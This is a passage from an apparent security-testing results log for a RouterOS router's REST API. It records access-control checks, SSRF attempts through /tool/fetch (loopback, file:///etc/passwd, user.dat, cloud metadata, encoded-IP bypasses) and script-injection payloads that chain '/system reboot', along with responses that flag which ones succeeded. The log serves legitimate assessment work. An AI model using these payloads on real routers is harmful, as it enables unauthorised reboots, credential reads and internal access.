+      "category": "acl_edge",
+      "name": "Read user PATCH /system/identity",
+      "description": "Test read-only user PATCH on Modify identity",
+      "result": "HTTP 400, modified=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.321495",
+      "details": {
+        "path": "/system/identity",
+        "status": 400,
+        "modified": false,
+        "response": "{'detail': 'missing or invalid resource identifier', 'error': 400, 'message': 'Bad Request'}"
+      }
+    },
+    {
+      "id": 56,
+      "category": "acl_edge",
+      "name": "Read user PATCH /ip/dns",
+      "description": "Test read-only user PATCH on Modify DNS",
+      "result": "HTTP 400, modified=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.321495",
+      "details": {
+        "path": "/ip/dns",
+        "status": 400,
+        "modified": false,
+        "response": "{'detail': 'missing or invalid resource identifier', 'error': 400, 'message': 'Bad Request'}"
+      }
+    },
+    {
+      "id": 57,
+      "category": "acl_edge",
+      "name": "Write user DELETE script",
+      "description": "Test write-only user DELETE on /system/script",
+      "result": "HTTP 204, deleted=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:20:49.321495",
+      "details": {
+        "status": 204,
+        "deleted": true,
+        "response": ""
+      }
+    },
+    {
+      "id": 58,
+      "category": "acl_edge",
+      "name": "File access: admin (full)",
+      "description": "Test full user access to /file endpoint",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.321495",
+      "details": {
+        "user": "admin",
+        "group": "full",
+        "status": 200,
+        "file_count": 4,
+        "data_preview": "[{'.id': '*/1000FE210466696C65', 'contents': '<!doctype html>\\n<html lang=\"en\">\\n<meta charset=\"utf-8\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\\n<link rel=\"icon\" href=\"/favicon.png\">\\n<link rel=\"icon\" href=\"/favicon.svg\">\\n<title>RouterOS</title>\\n<link rel=\"stylesheet\""
+      }
+    },
+    {
+      "id": 59,
+      "category": "acl_edge",
+      "name": "File access: testfull (full)",
+      "description": "Test full user access to /file endpoint",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.369471",
+      "details": {
+        "user": "testfull",
+        "group": "full",
+        "status": 200,
+        "file_count": 4,
+        "data_preview": "[{'.id': '*/1000FE210466696C65', 'contents': '<!doctype html>\\n<html lang=\"en\">\\n<meta charset=\"utf-8\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\\n<link rel=\"icon\" href=\"/favicon.png\">\\n<link rel=\"icon\" href=\"/favicon.svg\">\\n<title>RouterOS</title>\\n<link rel=\"stylesheet\""
+      }
+    },
+    {
+      "id": 60,
+      "category": "acl_edge",
+      "name": "File access: testread (read)",
+      "description": "Test read user access to /file endpoint",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.369471",
+      "details": {
+        "user": "testread",
+        "group": "read",
+        "status": 200,
+        "file_count": 4,
+        "data_preview": "[{'.id': '*/1000FE210466696C65', 'contents': '<!doctype html>\\n<html lang=\"en\">\\n<meta charset=\"utf-8\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\\n<link rel=\"icon\" href=\"/favicon.png\">\\n<link rel=\"icon\" href=\"/favicon.svg\">\\n<title>RouterOS</title>\\n<link rel=\"stylesheet\""
+      }
+    },
+    {
+      "id": 61,
+      "category": "acl_edge",
+      "name": "File access: testwrite (write)",
+      "description": "Test write user access to /file endpoint",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "details": {
+        "user": "testwrite",
+        "group": "write",
+        "status": 200,
+        "file_count": 4,
+        "data_preview": "[{'.id': '*/1000FE210466696C65', 'contents': '<!doctype html>\\n<html lang=\"en\">\\n<meta charset=\"utf-8\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\\n<link rel=\"icon\" href=\"/favicon.png\">\\n<link rel=\"icon\" href=\"/favicon.svg\">\\n<title>RouterOS</title>\\n<link rel=\"stylesheet\""
+      }
+    },
+    {
+      "id": 62,
+      "category": "acl_edge",
+      "name": "testread POST /system/reboot",
+      "description": "Test read user POST on Reboot router",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "details": {
+        "user": "testread",
+        "group": "read",
+        "path": "/system/reboot",
+        "status": 200,
+        "accessible": true
+      }
+    },
+    {
+      "id": 63,
+      "category": "acl_edge",
+      "name": "testwrite POST /system/reboot",
+      "description": "Test write user POST on Reboot router",
+      "result": "HTTP 400, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "details": {
+        "user": "testwrite",
+        "group": "write",
+        "path": "/system/reboot",
+        "status": 400,
+        "accessible": false
+      }
+    },
+    {
+      "id": 64,
+      "category": "acl_edge",
+      "name": "testread POST /system/shutdown",
+      "description": "Test read user POST on Shutdown router",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "details": {
+        "user": "testread",
+        "group": "read",
+        "path": "/system/shutdown",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 65,
+      "category": "acl_edge",
+      "name": "testwrite POST /system/shutdown",
+      "description": "Test write user POST on Shutdown router",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "details": {
+        "user": "testwrite",
+        "group": "write",
+        "path": "/system/shutdown",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 66,
+      "category": "acl_edge",
+      "name": "testread POST /system/reset-configuration",
+      "description": "Test read user POST on Factory reset",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.481415",
+      "details": {
+        "user": "testread",
+        "group": "read",
+        "path": "/system/reset-configuration",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 67,
+      "category": "acl_edge",
+      "name": "testwrite POST /system/reset-configuration",
+      "description": "Test write user POST on Factory reset",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.485413",
+      "details": {
+        "user": "testwrite",
+        "group": "write",
+        "path": "/system/reset-configuration",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 68,
+      "category": "acl_edge",
+      "name": "testread POST /system/backup/save",
+      "description": "Test read user POST on Create backup",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.485413",
+      "details": {
+        "user": "testread",
+        "group": "read",
+        "path": "/system/backup/save",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 69,
+      "category": "acl_edge",
+      "name": "testwrite POST /system/backup/save",
+      "description": "Test write user POST on Create backup",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.489411",
+      "details": {
+        "user": "testwrite",
+        "group": "write",
+        "path": "/system/backup/save",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 70,
+      "category": "acl_edge",
+      "name": "testread POST /user/add",
+      "description": "Test read user POST on Add user",
+      "result": "HTTP 0, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.489411",
+      "details": {
+        "user": "testread",
+        "group": "read",
+        "path": "/user/add",
+        "status": 0,
+        "accessible": false
+      }
+    },
+    {
+      "id": 71,
+      "category": "acl_edge",
+      "name": "testwrite POST /user/add",
+      "description": "Test write user POST on Add user",
+      "result": "HTTP 500, accessible=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:05.513395",
+      "details": {
+        "user": "testwrite",
+        "group": "write",
+        "path": "/user/add",
+        "status": 500,
+        "accessible": false
+      }
+    },
+    {
+      "id": 72,
+      "category": "ssrf_fetch",
+      "name": "SSRF: loopback_http",
+      "description": "Test SSRF via /tool/fetch with URL: http://127.0.0.1:80/rest/system/resource",
+      "result": "HTTP 400, accepted=False, has_content=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:06.532885",
+      "details": {
+        "ssrf_name": "loopback_http",
+        "url": "http://127.0.0.1:80/rest/system/resource",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 401', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": true
+      }
+    },
+    {
+      "id": 73,
+      "category": "ssrf_fetch",
+      "name": "SSRF: loopback_api",
+      "description": "Test SSRF via /tool/fetch with URL: http://127.0.0.1:8728/",
+      "result": "HTTP 400, accepted=False, has_content=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:16.543877",
+      "details": {
+        "ssrf_name": "loopback_api",
+        "url": "http://127.0.0.1:8728/",
+        "status": 400,
+        "response": "{'detail': 'failure: Idle timeout - waiting data', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": true
+      }
+    },
+    {
+      "id": 74,
+      "category": "ssrf_fetch",
+      "name": "SSRF: loopback_winbox",
+      "description": "Test SSRF via /tool/fetch with URL: http://127.0.0.1:8291/",
+      "result": "HTTP 400, accepted=False, has_content=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:26.554869",
+      "details": {
+        "ssrf_name": "loopback_winbox",
+        "url": "http://127.0.0.1:8291/",
+        "status": 400,
+        "response": "{'detail': 'failure: Idle timeout - waiting data', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": true
+      }
+    },
+    {
+      "id": 75,
+      "category": "ssrf_fetch",
+      "name": "SSRF: self_ip",
+      "description": "Test SSRF via /tool/fetch with URL: http://[REDACTED-INTERNAL-IP]/rest/system/resource",
+      "result": "HTTP 400, accepted=False, has_content=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:27.550371",
+      "details": {
+        "ssrf_name": "self_ip",
+        "url": "http://[REDACTED-INTERNAL-IP]/rest/system/resource",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 401', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": true
+      }
+    },
+    {
+      "id": 76,
+      "category": "ssrf_fetch",
+      "name": "SSRF: self_api",
+      "description": "Test SSRF via /tool/fetch with URL: http://[REDACTED-INTERNAL-IP]:8728/",
+      "result": "HTTP 400, accepted=False, has_content=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.565361",
+      "details": {
+        "ssrf_name": "self_api",
+        "url": "http://[REDACTED-INTERNAL-IP]:8728/",
+        "status": 400,
+        "response": "{'detail': 'failure: Idle timeout - waiting data', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": true
+      }
+    },
+    {
+      "id": 77,
+      "category": "ssrf_fetch",
+      "name": "SSRF: file_etc_passwd",
+      "description": "Test SSRF via /tool/fetch with URL: file:///etc/passwd",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.569359",
+      "details": {
+        "ssrf_name": "file_etc_passwd",
+        "url": "file:///etc/passwd",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 78,
+      "category": "ssrf_fetch",
+      "name": "SSRF: file_user_dat",
+      "description": "Test SSRF via /tool/fetch with URL: file:///rw/store/user.dat",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.573357",
+      "details": {
+        "ssrf_name": "file_user_dat",
+        "url": "file:///rw/store/user.dat",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 79,
+      "category": "ssrf_fetch",
+      "name": "SSRF: file_nova_etc",
+      "description": "Test SSRF via /tool/fetch with URL: file:///nova/etc/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.577355",
+      "details": {
+        "ssrf_name": "file_nova_etc",
+        "url": "file:///nova/etc/",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 80,
+      "category": "ssrf_fetch",
+      "name": "SSRF: file_flash",
+      "description": "Test SSRF via /tool/fetch with URL: file:///flash/nova/etc/passwd",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.577355",
+      "details": {
+        "ssrf_name": "file_flash",
+        "url": "file:///flash/nova/etc/passwd",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 81,
+      "category": "ssrf_fetch",
+      "name": "SSRF: file_rw_config",
+      "description": "Test SSRF via /tool/fetch with URL: file:///rw/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.585351",
+      "details": {
+        "ssrf_name": "file_rw_config",
+        "url": "file:///rw/",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 82,
+      "category": "ssrf_fetch",
+      "name": "SSRF: gopher_api",
+      "description": "Test SSRF via /tool/fetch with URL: gopher://127.0.0.1:8728/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.589349",
+      "details": {
+        "ssrf_name": "gopher_api",
+        "url": "gopher://127.0.0.1:8728/",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 83,
+      "category": "ssrf_fetch",
+      "name": "SSRF: gopher_winbox",
+      "description": "Test SSRF via /tool/fetch with URL: gopher://127.0.0.1:8291/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.593347",
+      "details": {
+        "ssrf_name": "gopher_winbox",
+        "url": "gopher://127.0.0.1:8291/",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 84,
+      "category": "ssrf_fetch",
+      "name": "SSRF: dict_api",
+      "description": "Test SSRF via /tool/fetch with URL: dict://127.0.0.1:8728/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.597345",
+      "details": {
+        "ssrf_name": "dict_api",
+        "url": "dict://127.0.0.1:8728/",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 85,
+      "category": "ssrf_fetch",
+      "name": "SSRF: tftp_local",
+      "description": "Test SSRF via /tool/fetch with URL: tftp://127.0.0.1/test",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:37.601343",
+      "details": {
+        "ssrf_name": "tftp_local",
+        "url": "tftp://127.0.0.1/test",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 86,
+      "category": "ssrf_fetch",
+      "name": "SSRF: aws_metadata",
+      "description": "Test SSRF via /tool/fetch with URL: http://[REDACTED-IP]/latest/meta-data/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:47.612335",
+      "details": {
+        "ssrf_name": "aws_metadata",
+        "url": "http://[REDACTED-IP]/latest/meta-data/",
+        "status": 400,
+        "response": "{'detail': 'failure: Idle timeout - connecting', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 87,
+      "category": "ssrf_fetch",
+      "name": "SSRF: aws_metadata_v2",
+      "description": "Test SSRF via /tool/fetch with URL: http://[REDACTED-IP]/latest/api/token",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:57.623327",
+      "details": {
+        "ssrf_name": "aws_metadata_v2",
+        "url": "http://[REDACTED-IP]/latest/api/token",
+        "status": 400,
+        "response": "{'detail': 'failure: Idle timeout - connecting', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 88,
+      "category": "ssrf_fetch",
+      "name": "SSRF: gcp_metadata",
+      "description": "Test SSRF via /tool/fetch with URL: http://metadata.google.internal/computeMetadata/v1/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:21:58.630823",
+      "details": {
+        "ssrf_name": "gcp_metadata",
+        "url": "http://metadata.google.internal/computeMetadata/v1/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 89,
+      "category": "ssrf_fetch",
+      "name": "SSRF: azure_metadata",
+      "description": "Test SSRF via /tool/fetch with URL: http://[REDACTED-IP]/metadata/instance?api-version=2021-01-01",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:08.657807",
+      "details": {
+        "ssrf_name": "azure_metadata",
+        "url": "http://[REDACTED-IP]/metadata/instance?api-version=2021-01-01",
+        "status": 400,
+        "response": "{'detail': 'failure: Idle timeout - connecting', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 90,
+      "category": "ssrf_fetch",
+      "name": "SSRF: ipv6_loopback",
+      "description": "Test SSRF via /tool/fetch with URL: http://[::1]/",
+      "result": "HTTP 200, accepted=True, has_content=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:08.669801",
+      "details": {
+        "ssrf_name": "ipv6_loopback",
+        "url": "http://[::1]/",
+        "status": 200,
+        "response": "[{'.section': '0', 'downloaded': '1', 'duration': '0s', 'status': 'finished', 'total': '1'}]",
+        "accepted": true,
+        "has_content": true
+      }
+    },
+    {
+      "id": 91,
+      "category": "ssrf_fetch",
+      "name": "SSRF: ipv6_loopback_rest",
+      "description": "Test SSRF via /tool/fetch with URL: http://[::1]:80/rest/system/resource",
+      "result": "HTTP 400, accepted=False, has_content=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:09.689291",
+      "details": {
+        "ssrf_name": "ipv6_loopback_rest",
+        "url": "http://[::1]:80/rest/system/resource",
+        "status": 400,
+        "response": "{'detail': 'failure: Fetch failed with status 401', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": true
+      }
+    },
+    {
+      "id": 92,
+      "category": "ssrf_fetch",
+      "name": "SSRF: url_encoded_localhost",
+      "description": "Test SSRF via /tool/fetch with URL: http://%31%32%37%2e%30%2e%30%2e%31/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:10.696787",
+      "details": {
+        "ssrf_name": "url_encoded_localhost",
+        "url": "http://%31%32%37%2e%30%2e%30%2e%31/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 93,
+      "category": "ssrf_fetch",
+      "name": "SSRF: hex_ip",
+      "description": "Test SSRF via /tool/fetch with URL: http://0x7f000001/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:11.700285",
+      "details": {
+        "ssrf_name": "hex_ip",
+        "url": "http://0x7f000001/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 94,
+      "category": "ssrf_fetch",
+      "name": "SSRF: decimal_ip",
+      "description": "Test SSRF via /tool/fetch with URL: http://2130706433/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:12.703783",
+      "details": {
+        "ssrf_name": "decimal_ip",
+        "url": "http://2130706433/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 95,
+      "category": "ssrf_fetch",
+      "name": "SSRF: octal_ip",
+      "description": "Test SSRF via /tool/fetch with URL: http://0177.0.0.01/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:13.711279",
+      "details": {
+        "ssrf_name": "octal_ip",
+        "url": "http://0177.0.0.01/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 96,
+      "category": "ssrf_fetch",
+      "name": "SSRF: double_encoded",
+      "description": "Test SSRF via /tool/fetch with URL: http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:14.734767",
+      "details": {
+        "ssrf_name": "double_encoded",
+        "url": "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 97,
+      "category": "ssrf_fetch",
+      "name": "SSRF: redirect_test",
+      "description": "Test SSRF via /tool/fetch with URL: http://127.0.0.1:80/",
+      "result": "HTTP 200, accepted=True, has_content=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:15.706281",
+      "details": {
+        "ssrf_name": "redirect_test",
+        "url": "http://127.0.0.1:80/",
+        "status": 200,
+        "response": "[{'.section': '0', 'status': 'requesting'}, {'.section': '1', 'downloaded': '1', 'duration': '1s', 'status': 'finished', 'total': '1'}]",
+        "accepted": true,
+        "has_content": true
+      }
+    },
+    {
+      "id": 98,
+      "category": "ssrf_fetch",
+      "name": "SSRF: external_dns",
+      "description": "Test SSRF via /tool/fetch with URL: http://localhost.localdomain/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:16.745761",
+      "details": {
+        "ssrf_name": "external_dns",
+        "url": "http://localhost.localdomain/",
+        "status": 400,
+        "response": "{'detail': 'failure: resolving error', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 99,
+      "category": "ssrf_fetch",
+      "name": "SSRF: ftp_self",
+      "description": "Test SSRF via /tool/fetch with URL: ftp://admin:TestPass123@127.0.0.1/",
+      "result": "HTTP 400, accepted=False, has_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:16.749759",
+      "details": {
+        "ssrf_name": "ftp_self",
+        "url": "ftp://admin:TestPass123@127.0.0.1/",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "accepted": false,
+        "has_content": false
+      }
+    },
+    {
+      "id": 100,
+      "category": "ssrf_fetch",
+      "name": "SSRF: url_with_creds",
+      "description": "Test SSRF via /tool/fetch with URL: http://admin:TestPass123@127.0.0.1/rest/user",
+      "result": "HTTP 200, accepted=True, has_content=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:17.749259",
+      "details": {
+        "ssrf_name": "url_with_creds",
+        "url": "http://admin:TestPass123@127.0.0.1/rest/user",
+        "status": 200,
+        "response": "[{'.section': '0', 'status': 'requesting'}, {'.section': '1', 'downloaded': '24', 'duration': '1s', 'status': 'finished', 'total': '24'}]",
+        "accepted": true,
+        "has_content": true
+      }
+    },
+    {
+      "id": 101,
+      "category": "ssrf_fetch",
+      "name": "SSRF unauthenticated",
+      "description": "Test /tool/fetch without authentication",
+      "result": "HTTP 401, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.749259",
+      "details": {
+        "status": 401,
+        "accepted": false
+      }
+    },
+    {
+      "id": 102,
+      "category": "cmd_injection",
+      "name": "Script inject: semicolon_reboot",
+      "description": "Create script with injection payload (semicolon_reboot)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.749259",
+      "details": {
+        "name": "semicolon_reboot",
+        "source": ":log info \"safe\"; /system reboot",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*9C'}"
+      }
+    },
+    {
+      "id": 103,
+      "category": "cmd_injection",
+      "name": "Run injected: semicolon_reboot",
+      "description": "Execute injected script (semicolon_reboot)",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:17.757255",
+      "details": {
+        "name": "semicolon_reboot",
+        "run_status": 200,
+        "response": "[]"
+      }
+    },
+    {
+      "id": 104,
+      "category": "cmd_injection",
+      "name": "Script inject: backtick_exec",
+      "description": "Create script with injection payload (backtick_exec)",
+      "result": "HTTP 400, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.765251",
+      "details": {
+        "name": "backtick_exec",
+        "source": ":log info `id`",
+        "status": 400,
+        "accepted": false,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}"
+      }
+    },
+    {
+      "id": 105,
+      "category": "cmd_injection",
+      "name": "Script inject: dollar_paren",
+      "description": "Create script with injection payload (dollar_paren)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.773247",
+      "details": {
+        "name": "dollar_paren",
+        "source": ":log info $(id)",
+        "status": 0,
+        "accepted": false,
+        "response": "('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))"
+      }
+    },
+    {
+      "id": 106,
+      "category": "cmd_injection",
+      "name": "Script inject: pipe_cmd",
+      "description": "Create script with injection payload (pipe_cmd)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.785241",
+      "details": {
+        "name": "pipe_cmd",
+        "source": ":log info \"test\" | id",
+        "status": 0,
+        "accepted": false,
+        "response": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/script/add (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315f460>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 107,
+      "category": "cmd_injection",
+      "name": "Script inject: ampersand_chain",
+      "description": "Create script with injection payload (ampersand_chain)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.785241",
+      "details": {
+        "name": "ampersand_chain",
+        "source": ":log info \"test\" && id",
+        "status": 0,
+        "accepted": false,
+        "response": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/script/add (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315fce0>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 108,
+      "category": "cmd_injection",
+      "name": "Script inject: newline_escape",
+      "description": "Create script with injection payload (newline_escape)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.789239",
+      "details": {
+        "name": "newline_escape",
+        "source": ":log info \"safe\"\n/system reboot",
+        "status": 0,
+        "accepted": false,
+        "response": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/script/add (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315f8a0>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 109,
+      "category": "cmd_injection",
+      "name": "Script inject: null_byte_inject",
+      "description": "Create script with injection payload (null_byte_inject)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.793237",
+      "details": {
+        "name": "null_byte_inject",
+        "source": ":log info \"test\u0000/system reboot\"",
+        "status": 0,
+        "accepted": false,
+        "response": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/script/add (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315e470>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 110,
+      "category": "cmd_injection",
+      "name": "Script inject: execute_cmd",
+      "description": "Create script with injection payload (execute_cmd)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.793237",
+      "details": {
+        "name": "execute_cmd",
+        "source": ":execute script=\"/system reboot\"",
+        "status": 0,
+        "accepted": false,
